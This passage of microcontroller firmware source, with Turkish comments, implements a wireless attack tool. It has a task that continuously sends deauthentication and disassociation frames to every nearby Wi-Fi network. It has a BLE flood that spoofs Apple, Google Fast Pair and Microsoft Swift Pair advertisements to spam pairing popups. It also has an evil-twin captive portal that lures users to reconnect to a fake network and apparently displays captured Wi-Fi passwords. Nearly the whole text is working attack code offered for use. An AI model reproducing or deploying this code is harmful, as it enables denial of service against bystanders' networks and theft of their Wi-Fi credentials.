static uint8_t ble_BeatsStudioPro[31] = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x17,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_BeatsFitPro[31]    = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_BeatsStudioBuds[31]= {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_BeatsX[31]         = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_BeatsSolo3[31]     = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x06,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
static uint8_t ble_BeatsFlex[31]      = {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};

// ── Apple Nearby Action — 23 byte raw AD paketi ───────────────────────────────
// [0x16=22][0xff=ManufSpec][0x4c,0x00=Apple][0x04=Nearby][0x04,len,...]
// [0x0f=type][0x05=len][0xc1=flags][action_byte][...]
static uint8_t ble_AppleTVSetup[23]   = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static uint8_t ble_AppleTVPair[23]    = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static uint8_t ble_AppleTVNewUser[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static uint8_t ble_HomepodSetup[23]   = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static uint8_t ble_SetupNewPhone[23]  = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static uint8_t ble_AppleVisionPro[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x24,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static uint8_t ble_TVColorBalance[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x1e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};
static uint8_t ble_TransferNumber[23] = {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00};

struct BLERawPacket {
  uint8_t *pkt;
  uint8_t  len;
};

static const BLERawPacket BLE_APPLE_PKTS[] = {
  {ble_Airpods,31},        {ble_AirpodsPro,31},      {ble_AirpodsMax,31},
  {ble_AirpodsGen2,31},    {ble_AirpodsGen3,31},     {ble_AirpodsPro2,31},
  {ble_PowerBeats,31},     {ble_PowerBeatsPro,31},   {ble_BeatsSoloPro,31},
  {ble_BeatsStudio3,31},   {ble_BeatsStudioPro,31},  {ble_BeatsFitPro,31},
  {ble_BeatsStudioBuds,31},{ble_BeatsX,31},           {ble_BeatsSolo3,31},
  {ble_BeatsFlex,31},      {ble_AppleTVSetup,23},    {ble_AppleTVPair,23},
  {ble_AppleTVNewUser,23}, {ble_HomepodSetup,23},    {ble_SetupNewPhone,23},
  {ble_AppleVisionPro,23}, {ble_TVColorBalance,23},  {ble_TransferNumber,23},
};
#define BLE_APPLE_PKT_COUNT 24

// ── Google Fast Pair model ID tablosu (Android full-screen pairing popup) ─────
// Format: [0x03][0x03][0x2C][0xFE] UUID list + [0x06][0x16][0x2C][0xFE][modelID x3] + [0x02][0x0A][rssi]
static const uint32_t BLE_GFP_MODELS[] = {
  0x92BBBD, // Pixel Buds
  0xD446A7, // Sony XM5
  0x821F66, // JBL Flip 6
  0x000007, // Android Auto
  0xCD8256, // Bose NC 700
  0x01E5CE, // BLE-Phone
  0x06AE20, // Galaxy S21
  0xF52494, // JBL Buds Pro
  0x718FA4, // JBL Live 300TWS
  0x1E8B18, // SRS-XB43
  0x06C95C, // Sony WH-1000XM2
  0x07A41C, // WF-C700N
  0x054B2D, // JBL TUNE125TWS
  0x0660D7, // JBL LIVE770NC
  0xD99CA1, // Flipper Zero
  0x72EF8D, // Sony WF-1000XM5
  0x04ACFC, // JBL WAVE BEAM
  0x05A963, // WONDERBOOM 3
  0x0001F0, // Bisto CSR Dev
  0x000047, // Arduino 101
};
#define BLE_GFP_COUNT 20

// ═══════════════════════════════════════════════════════════════════════════════
// ═══════════ DEAUTH ALL GÖREVİ — TÜM TARANAN AĞLARA DEAUTH ══════════════════
// ═══════════════════════════════════════════════════════════════════════════════
void deauthAllTask(void *param) {
  (void)param;

  uint8_t frame[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x07, 0x00
  };

  wifi_disable_powersave();

  // ── Deauth All hız parametreleri ──────────────────────────────────────────
  const int DA_FRAME_COUNT_2G   = 6;    // burst başına frame sayısı
  const int DA_FRAME_COUNT_5G   = 5;
  const int DA_EXTRA_COUNT_2G   = 2;    // ek burst sayısı
  const int DA_EXTRA_COUNT_5G   = 2;
  const int DA_CH_SWITCH_MS     = 10;   // kanal geçiş süresi: radyonun kanala kilitlenmesi için yeterli
  const int DA_NET_DWELL_MS     = 60;   // her ağ için minimum kalma süresi: frame'lerin havaya çıkmasını garantiler

#define DEAUTH_ALL_RESCAN_INTERVAL_MS 120000UL  // 60s→120s: daha seyrek, saldırıyı az keser
  unsigned long deauth_all_last_scan_ms = 0;

  // Görev başlar başlamaz hemen tarama yap — networks boşsa beklemeden başlat
  if (scan_status == SCAN_IDLE) {
    startScan();
    unsigned long scan_wait_start = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    while (scan_status == SCAN_RUNNING && deauth_all_active) {
      if ((unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS) - scan_wait_start > 20000UL) {
        break;
      }
      vTaskDelay(pdMS_TO_TICKS(300));
    }
    deauth_all_last_scan_ms = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
  }

  while (deauth_all_active) {
    // Periyodik otomatik yeniden tarama (arka planda, deauth durdurmaz)
    unsigned long now_ms = (unsigned long)(xTaskGetTickCount() * portTICK_PERIOD_MS);
    if (now_ms - deauth_all_last_scan_ms > DEAUTH_ALL_RESCAN_INTERVAL_MS) {
      if (scan_status == SCAN_IDLE) {
        startScan();  // ayrı task olarak çalışır, deauth durmaz
      }
      deauth_all_last_scan_ms = now_ms;
    }

    // Her döngü başında güncel networks listesinden taze snapshot al
    std::vector<NetworkInfo> snap;
    if (networks_mutex && xSemaphoreTake(networks_mutex, pdMS_TO_TICKS(200)) == pdTRUE) {
      snap = networks;
      xSemaphoreGive(networks_mutex);
    }

    if (snap.empty()) {
      vTaskDelay(pdMS_TO_TICKS(500));
      continue;
    }


    // ── WiFi Deauth turu — kanallar gruplandırılmış ───────────────────────────
    // Aynı kanalda olan ağları tek kanal switch'i ile saldır.
    // Kanal sırası: önce 2.4GHz (1-14), sonra 5GHz (36+).
    wifi_disable_powersave();

    // Snapshot'taki unique kanalları sıralı olarak topla
    std::vector<int> ch_order;
    for (auto &net : snap) {
      if (isFakeAPBSSID(net.bssid)) continue;
      bool found = false;
      for (int c : ch_order) { if (c == net.channel) { found = true; break; } }
      if (!found) ch_order.push_back(net.channel);
    }
    // 2.4GHz önce, 5GHz sonra
    std::vector<int> ch_sorted;
    for (int c : ch_order) { if (c < 36) ch_sorted.push_back(c); }
    for (int c : ch_order) { if (c >= 36) ch_sorted.push_back(c); }

    for (int ch : ch_sorted) {
      if (!deauth_all_active) break;

      bool is5g = (ch >= 36);
      int frameCount = is5g ? DA_FRAME_COUNT_5G : DA_FRAME_COUNT_2G;
      int extraBurst = is5g ? DA_EXTRA_COUNT_5G : DA_EXTRA_COUNT_2G;

      // Bu kanal için bir kez switch — gruptaki tüm ağlar buradan saldırılır
      wifi_set_channel(ch);
      vTaskDelay(pdMS_TO_TICKS(DA_CH_SWITCH_MS));

      // Aynı kanalda olan tüm ağları sırayla saldır
      for (auto &net : snap) {
        if (!deauth_all_active) break;
        if (net.channel != ch) continue;
        if (isFakeAPBSSID(net.bssid)) continue;

        // ── BSSID varyantlarını hesapla ─────────────────────────────────────
        uint8_t variants[3][6];
        int vcount = 0;
        for (int off = -1; off <= 1; off++) {
          uint8_t tmp[6];
          memcpy(tmp, net.bssid, 6);
          tmp[5] = (uint8_t)(tmp[5] + (uint8_t)off);
          if (!isFakeAPBSSID(tmp)) {
            memcpy(variants[vcount++], tmp, 6);
          }
        }
        if (vcount == 0) continue;

        // ── Ana burst: broadcast + unicast deauth/disassoc ──────────────────
        for (int burst = 0; burst < frameCount; burst++) {
          for (int v = 0; v < vcount; v++) {
            memcpy(&frame[10], variants[v], 6);
            memcpy(&frame[16], variants[v], 6);
            memset(&frame[4], 0xFF, 6);
            frame[0] = 0xC0; frame[24] = 0x07;
            safeSendMgnt(frame, 26);         // broadcast deauth

            frame[24] = 0x02;
            safeSendMgnt(frame, 26);         // broadcast disassoc

            memcpy(&frame[4], variants[v], 6);
            frame[0] = 0xC0; frame[24] = 0x07;
            safeSendMgnt(frame, 26);         // unicast deauth

            frame[0] = 0xA0; frame[24] = 0x07;
            safeSendMgnt(frame, 26);         // unicast disassoc
          }
        }

        // ── Ek broadcast burst ───────────────────────────────────────────────
        memcpy(&frame[10], net.bssid, 6);
        memcpy(&frame[16], net.bssid, 6);
        memset(&frame[4], 0xFF, 6);
        frame[0] = 0xC0; frame[24] = 0x07;
        for (int extra = 0; extra < extraBurst; extra++) {
          safeSendMgnt(frame, 26);
          safeSendMgnt(frame, 26);
          safeSendMgnt(frame, 26);
        }

        vTaskDelay(pdMS_TO_TICKS(DA_NET_DWELL_MS));
      }
    }


    // Tur arası bekleme yok — maksimum hız için hemen sonraki tura geç
  }

  vTaskDelete(NULL);
}

// ═══════════════════════════════════════════════════════════════════════════════
// ══════════════════ BLE RAW ADV GÖNDERİCİ ════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════════
// Referans yaklaşımı: raw AD paketini doğrudan addData() ile ver,
// setAdvType(GAP_ADTYPE_ADV_NONCONN_IND) + updateAdvertParams() ile yayınla.
// Böylece cihaz AMEBA_BLE_DEV değil, manufacturer data'ya göre tanınır.
static void bleSetRawAdv(BLEAdvert *pAdv, const uint8_t *rawpkt, uint8_t rawlen) {
  pAdv->stopAdv();
  vTaskDelay(pdMS_TO_TICKS(5));

  // ── BLE TX Power: donanım maksimumu +8 dBm ──────────────────────────────
  // RTK BLE SDK: GAP_PARAM_ADV_TX_POWER_LEVEL = 0x12, int8_t (-20..+8 dBm)
  int8_t ble_tx_power = 8;
  le_adv_set_param(0x12, sizeof(ble_tx_power), &ble_tx_power);

  // ── Reklam aralığı: BLE spesifikasyon minimumu = 20ms (0x0020 × 0.625ms)
  // GAP_PARAM_ADV_MIN_INTERVAL = 0x15, GAP_PARAM_ADV_MAX_INTERVAL = 0x16
  uint16_t adv_interval = 0x0020;
  le_adv_set_param(0x15, sizeof(adv_interval), &adv_interval);
  le_adv_set_param(0x16, sizeof(adv_interval), &adv_interval);

  // ── Tüm 3 BLE reklam kanalı aktif: 37, 38, 39 (bit mask 0x07) ───────────
  // GAP_PARAM_ADV_CHANNEL_MAP = 0x18
  uint8_t ch_map = 0x07;
  le_adv_set_param(0x18, sizeof(ch_map), &ch_map);

  // ── Rastgele MAC: her çağrı = farklı cihaz görünümü ─────────────────────
  uint8_t rand_addr[6];
  if (le_gen_rand_addr((T_GAP_RAND_ADDR_TYPE)0, rand_addr) == GAP_CAUSE_SUCCESS) {
    le_set_rand_addr(rand_addr);
    uint8_t own_addr_type = 1; // GAP_LOCAL_ADDR_LE_RANDOM
    le_adv_set_param(0x06, sizeof(own_addr_type), &own_addr_type);
  }

  BLEAdvertData advData;
  advData.addData(rawpkt, rawlen);

  pAdv->setAdvType(GAP_ADTYPE_ADV_NONCONN_IND);
  pAdv->setAdvData(advData);
  pAdv->updateAdvertParams();
  pAdv->startAdv();
  vTaskDelay(pdMS_TO_TICKS(3));
}

// ═══════════════════════════════════════════════════════════════════════════════
// ══════════════════ BLE FLOOD GÖREVİ ═════════════════════════════════════════
// ═══════════════════════════════════════════════════════════════════════════════
void bleFloodTask(void *param) {
  (void)param;

  BLE.init();
  BLE.beginPeripheral();
  BLEAdvert *pAdv = BLE.configAdvert();

  // ── BLE init: tüm güç ve kanal parametrelerini en baştan max yap ─────────
  {
    int8_t  tx_pwr      = 8;       // +8 dBm — RTL8720DN donanım maksimumu
    uint16_t adv_itvl   = 0x0020;  // 20ms — BLE spesifikasyon minimumu
    uint8_t  ch_map     = 0x07;    // kanal 37 + 38 + 39 — hepsi aktif
    le_adv_set_param(0x12, sizeof(tx_pwr),   &tx_pwr);
    le_adv_set_param(0x15, sizeof(adv_itvl), &adv_itvl);
    le_adv_set_param(0x16, sizeof(adv_itvl), &adv_itvl);
    le_adv_set_param(0x18, sizeof(ch_map),   &ch_map);
  }

  // Google Fast Pair raw paketi (14 byte: UUID list + Service Data + TX Power)
  uint8_t gfp_pkt[14];
  gfp_pkt[0]  = 0x03; gfp_pkt[1]  = 0x03; gfp_pkt[2]  = 0x2C; gfp_pkt[3]  = 0xFE;
  gfp_pkt[4]  = 0x06; gfp_pkt[5]  = 0x16; gfp_pkt[6]  = 0x2C; gfp_pkt[7]  = 0xFE;
  // TX Power AD: [0x02][0x0A=TX Power Level AD type][0x7F=+127 dBm max int8]
  gfp_pkt[11] = 0x02; gfp_pkt[12] = 0x0A; gfp_pkt[13] = 0x7F;

  // Microsoft Swift Pair raw paketi (manufacturer specific, company 0x0006)
  uint8_t ms_pkt[13];
  ms_pkt[1] = 0xFF; ms_pkt[2] = 0x06; ms_pkt[3] = 0x00;
  ms_pkt[4] = 0x03; ms_pkt[5] = 0x00; ms_pkt[6] = 0x80;

  size_t apple_idx = 0;
  size_t gfp_idx   = 0;
  uint8_t phase    = 0; // 0-2: Apple, 3-4: Google, 5: Microsoft

  while (ble_flood_active) {

    // ── PHASE 0-2: Apple Proximity Pairing — sıralı cihaz listesi ──────────
    // Referans projeden alınan doğru raw AD formatı ile gönderilir
    if (phase < 3) {
      const BLERawPacket &p = BLE_APPLE_PKTS[apple_idx % BLE_APPLE_PKT_COUNT];
      uint8_t buf[31];
      memcpy(buf, p.pkt, p.len);
      // Anti-duplicate: account token alanını (byte 19-30) rastgele değiştir
      TickType_t t = xTaskGetTickCount();
      if (p.len == 31) {
        buf[19] = (uint8_t)(t & 0xFF);
        buf[20] = (uint8_t)((t >> 8) & 0xFF);
        buf[21] = (uint8_t)((apple_idx * 7 + 3) & 0xFF);
      }
      bleSetRawAdv(pAdv, buf, p.len);
      apple_idx++;
      vTaskDelay(pdMS_TO_TICKS(80));
    }

    // ── PHASE 3-4: Google Fast Pair — Android full-screen popup ─────────────
    else if (phase < 5) {
      uint32_t model = BLE_GFP_MODELS[gfp_idx % BLE_GFP_COUNT];
      gfp_pkt[8]  = (uint8_t)((model >> 16) & 0xFF);
      gfp_pkt[9]  = (uint8_t)((model >> 8)  & 0xFF);
      gfp_pkt[10] = (uint8_t)((model >> 0)  & 0xFF);
      bleSetRawAdv(pAdv, gfp_pkt, 14);
      gfp_idx++;
      vTaskDelay(pdMS_TO_TICKS(70));
    }

    // ── PHASE 5: Microsoft Swift Pair — Windows "Yeni cihaz" bildirimi ──────
    else {
      TickType_t t = xTaskGetTickCount();
      // rastgele uzunlukta isim (1-6 karakter) ile Swift Pair paketi
      uint8_t namelen = (uint8_t)((t & 0x05) + 1); // 1-6
      ms_pkt[0] = (uint8_t)(6 + namelen);           // length byte
      for (int c = 0; c < namelen; c++) {
        ms_pkt[7 + c] = (uint8_t)(0x41 + ((t + c * 7) % 26)); // A-Z
      }
      bleSetRawAdv(pAdv, ms_pkt, 7 + namelen);
      vTaskDelay(pdMS_TO_TICKS(80));
    }

    // Sıradaki phase'e geç (0→1→2→3→4→5→0→...)
    phase = (phase + 1) % 6;
  }

  pAdv->stopAdv();
  BLE.end();
  vTaskDelete(NULL);
}

// ─────────────────────────────────────────────────────────────────────────────

// ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
String rssiBar(int32_t rssi) {
  if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Mükemmel";
  if (rssi > -65) return "&#9608;&#9608;&#9608;&#9617; İyi";
  if (rssi > -75) return "&#9608;&#9608;&#9617;&#9617; Orta";
  return "&#9608;&#9617;&#9617;&#9617; Zayıf";
}

String buildRedirect() {
  String r = "HTTP/1.1 302 Found\r\nLocation: http://";
  r += AP_IP_ADDR;
  r += "/\r\nContent-Length: 0\r\nConnection: close\r\n\r\n";
  return r;
}

String parsePostParam(const String &body, const String &key) {
  int idx = body.indexOf(key + "=");
  if (idx == -1) return "";
  int start = idx + key.length() + 1;
  int end   = body.indexOf('&', start);
  if (end == -1) end = body.length();
  return urlDecode(body.substring(start, end));
}

static const char CSS_STR[] PROGMEM =
  "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f0f4f8;color:#2c3e50;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
  ".card{background:#ffffff;border-radius:12px;padding:36px 28px;width:100%;max-width:420px;box-shadow:0 12px 30px rgba(0,0,0,.08);border-top:6px solid #0056b3}"
  "h1{font-size:1.6rem;color:#1a252f;text-align:center;margin-bottom:12px;font-weight:700}.sub{text-align:center;font-size:0.95rem;color:#7f8c8d;margin-bottom:28px;line-height:1.6}"
  ".status-box{border-radius:8px;padding:14px 16px;margin-bottom:22px;font-size:0.95rem;font-weight:600;text-align:center}.ok{background:#eafaf1;border:1px solid #2ecc71;color:#27ae60}.err{background:#fdeced;border:1px solid #e74c3c;color:#c0392b}.wait{background:#ebf5fb;border:1px solid #3498db;color:#2980b9}"
  ".conn-status{border-radius:8px;padding:18px;margin-bottom:24px;font-size:1rem;background:#f8f9fa;border:1px solid #e1e8ed;line-height:1.5;color:#34495e;text-align:center}"
  ".net-list{list-style:none;margin-bottom:20px;max-height:260px;overflow-y:auto}.net-item{display:flex;align-items:center;padding:12px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;border:1px solid #eaeded;background:#fff;transition:all .2s}.net-item:hover{border-color:#3498db;background:#f4f6f9}"
  ".net-item input[type=radio]{margin-right:12px;accent-color:#0056b3;width:18px;height:18px;flex-shrink:0}.net-info{flex:1;min-width:0}.net-name{font-weight:600;font-size:1rem;color:#2c3e50;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.net-meta{font-size:.8rem;color:#95a5a6;margin-top:4px}"
  ".pass-wrap{margin-bottom:24px}label{display:block;font-size:.9rem;font-weight:600;color:#34495e;margin-bottom:8px}input[type=password],input[type=text]{width:100%;padding:14px 16px;border-radius:8px;border:1px solid #bdc3c7;background:#fff;color:#2c3e50;font-size:1.05rem;outline:none;transition:border .2s;box-shadow:inset 0 1px 3px rgba(0,0,0,0.05)}input:focus{border-color:#0056b3}"
  ".show-pass{font-size:.85rem;color:#7f8c8d;margin-top:8px;cursor:pointer;user-select:none;text-align:right}button{width:100%;padding:15px;border:none;border-radius:8px;background:#0056b3;color:#fff;font-size:1.1rem;font-weight:bold;cursor:pointer;transition:background .2s;box-shadow:0 4px 6px rgba(0,86,179,0.2)}.btn-blue{background:#34495e;box-shadow:none}button:hover{background:#004494}"
  ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #3498db;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes spin{to{transform:rotate(360deg)}}"
  ".footer{text-align:center;font-size:.8rem;color:#bdc3c7;margin-top:20px;border-top:1px solid #ecf0f1;padding-top:16px}"
  "#offline-bar{position:fixed;top:0;left:0;width:100%;background:#e74c3c;color:#fff;text-align:center;padding:12px;font-weight:bold;font-size:0.9rem;z-index:9999;display:none;box-shadow:0 2px 10px rgba(0,0,0,0.1)}</style>";

void sendChunkedCSS(WiFiClient &client) {
  const char *p = CSS_STR;
  while (*p) {
    if (!client.connected()) return;
    int len = 0;
    while (p[len] != '\0' && len < 512) len++;
    client.write((const uint8_t *)p, len);
    client.flush();
    delay(1);
    p += len;
  }
}

void sendOfflineScript(WiFiClient &client) {
  client.print("<div id='offline-bar'>&#9888; Bağlantı zayıf, lütfen sayfayı kapatmadan bekleyiniz...</div>");
  client.print("<script>");
  client.print("window.addEventListener('offline', function(){ document.getElementById('offline-bar').style.display='block'; });");
  client.print("window.addEventListener('online', function(){ document.getElementById('offline-bar').style.display='none'; });");
  client.print("</script>");
}

void sendStartPage(WiFiClient &client) {
  if (!client.connected()) return;
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Ağ Yapılandırma Sihirbazı</title>");
  sendChunkedCSS(client);
  if (!client.connected()) return;
  client.print("</head><body>");
  sendOfflineScript(client);

  client.print("<div class='card'>");
  client.print("<div style='text-align:center; margin-bottom:16px;'><svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#0056b3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M5 12.55a11 11 0 0 1 14.08 0'></path><path d='M1.42 9a16 16 0 0 1 21.16 0'></path><path d='M8.53 16.11a6 6 0 0 1 6.95 0'></path><line x1='12' y1='20' x2='12.01' y2='20'></line></svg></div>");
  client.print("<h1>Ağ Yapılandırma Sihirbazı</h1><p class='sub'>Lütfen erişim sağlamak istediğiniz ağı listeden seçiniz.</p>");

  if (scan_status == SCAN_RUNNING) {
      client.print("<div class='status-box wait'>&#128225; Çevre ağlar taranıyor, lütfen bekleyiniz...</div>");
  }

  if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
  client.print("<h2>&#128225; Taranan Ağlar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");

  if (networks.size() > 0) {
    for (int i = 0; i < (int)networks.size(); i++) {
      String safe = networks[i].ssid;
      safe.replace("&", "&amp;"); safe.replace("<", "&lt;"); safe.replace("'", "&#39;"); safe.replace("\"", "&quot;");

      client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
      client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
      client.print("<div class='net-info'><div class='net-name'>"); client.print(safe);
      if      (networks[i].enc == ENC_TYPE_NONE) client.print(" <span style='font-size:.7rem;background:#e74c3c;color:#fff;padding:2px 5px;border-radius:4px;'>Açık</span>");
      else if (networks[i].enc == ENC_TYPE_WPA3) client.print(" <span style='font-size:.7rem;background:#8e44ad;color:#fff;padding:2px 5px;border-radius:4px;'>WPA3</span>");
      else if (networks[i].enc == ENC_TYPE_TKIP) client.print(" <span style='font-size:.7rem;background:#e67e22;color:#fff;padding:2px 5px;border-radius:4px;'>WPA</span>");
      client.print("</div>");
      client.print("<div class='net-meta'>Sinyal Kalitesi: "); client.print(rssiBar(networks[i].rssi)); client.print("</div></div></li>");
    }
  } else if (scan_status != SCAN_RUNNING) {
    client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>❌ Herhangi bir ağ bulunamadı. Lütfen ağları yenile.</li>");
  }

  if (networks_mutex) xSemaphoreGive(networks_mutex);

  client.print("</ul>");

  if (networks.size() > 0) {
    client.print("<button type='submit'>İleri</button>");
  } else {
    client.print("<button type='submit' disabled style='opacity:0.5;cursor:not-allowed;'>İleri (Ağ seçilmedi)</button>");
  }

  client.print("</form>");
  client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Ağları Yenile</button></form>");

  if (deauth_all_active) {
    client.print("<div style='background:#fdeced;border:1px solid #e74c3c;border-radius:8px;padding:10px 14px;margin-top:12px;text-align:center;font-size:0.9rem;font-weight:600;color:#c0392b;'>&#9889; WiFi Deauth All AKTIF — tüm ağlara deauth gönderiliyor</div>");
    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:8px;background:#c0392b;box-shadow:none;'>&#9724; WiFi Deauth All Durdur</button></form>");
  } else {
    client.print("<form method='POST' action='/deauth_all'><button type='submit' style='margin-top:12px;background:#c0392b;box-shadow:none;'>&#9889; WiFi Deauth All — Tüm Ağları Deauth Et</button></form>");
  }
  if (ble_flood_active) {
    client.print("<div style='background:#f0eafd;border:1px solid #8e44ad;border-radius:8px;padding:10px 14px;margin-top:8px;text-align:center;font-size:0.9rem;font-weight:600;color:#6c3483;'>&#128268; BLE Flood AKTIF — BLE kanalları dolduruluyor</div>");
    client.print("<form method='POST' action='/ble_flood'><button type='submit' style='margin-top:8px;background:#8e44ad;box-shadow:none;'>&#9724; BLE Flood Durdur</button></form>");
  } else {
    client.print("<form method='POST' action='/ble_flood'><button type='submit' style='margin-top:8px;background:#8e44ad;box-shadow:none;'>&#128268; BLE Flood — Sahte BLE Cihaz Yayını</button></form>");
  }

  if (strlen(saved_ssid) > 0) {
    client.print("<div style='background:#fff;border:1px solid #bdc3c7;border-radius:8px;padding:12px;margin-top:20px;'>");
    client.print("<h3 style='font-size:0.9rem;color:#0056b3;margin-bottom:8px;text-align:center;'>Sistem Kayıtları</h3>");
    client.print("<div style='display:flex;justify-content:space-between;align-items:center;background:#f4f6f9;padding:10px;border-radius:6px;'>");
    client.print("<div style='display:flex;flex-direction:column;font-size:0.85rem;'>");
    client.print("<span style='color:#34495e;'><b>Ağ:</b> <span style='color:#2c3e50;'>"); client.print(saved_ssid); client.print("</span></span>");
    client.print("<span style='color:#34495e;margin-top:4px;'><b>Şifre:</b> <span style='color:#27ae60;'>"); client.print(saved_pass); client.print("</span></span>");
    client.print("</div>");
    client.print("<form method='POST' action='/delete_cred' style='margin:0;'>");
    client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;width:auto;box-shadow:none;'>Sil</button>");
    client.print("</form></div></div>");
  }

  client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy;</div></div></body></html>");
}

void sendSwitchingPage(WiFiClient &client) {
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Bağlantı Hazırlanıyor</title>");
  client.print("<style>body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#333;text-align:center;padding:50px 20px;} b{color:#0056b3;}</style></head><body>");
  client.print("<h2 style='color:#2c3e50;'>&#8987; Ağ Yapılandırması Hazırlanıyor...</h2>");
  client.print("<p style='color:#7f8c8d;font-size:16px;margin-top:20px;line-height:1.6'>Lütfen cihazınızın Wi-Fi ayarlarına giderek <b>");
  client.print(target_ssid);
  client.print("</b> ağına tekrar bağlanınız.</p></body></html>");
}

void sendPortalPage(WiFiClient &client, bool show_result) {
  if (!client.connected()) return;
  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
  client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>İnternet Bağlantı Doğrulaması</title>");
  sendChunkedCSS(client);
  if (!client.connected()) return;
  client.print("</head><body>");
  sendOfflineScript(client);

  client.print("<div class='card'>");
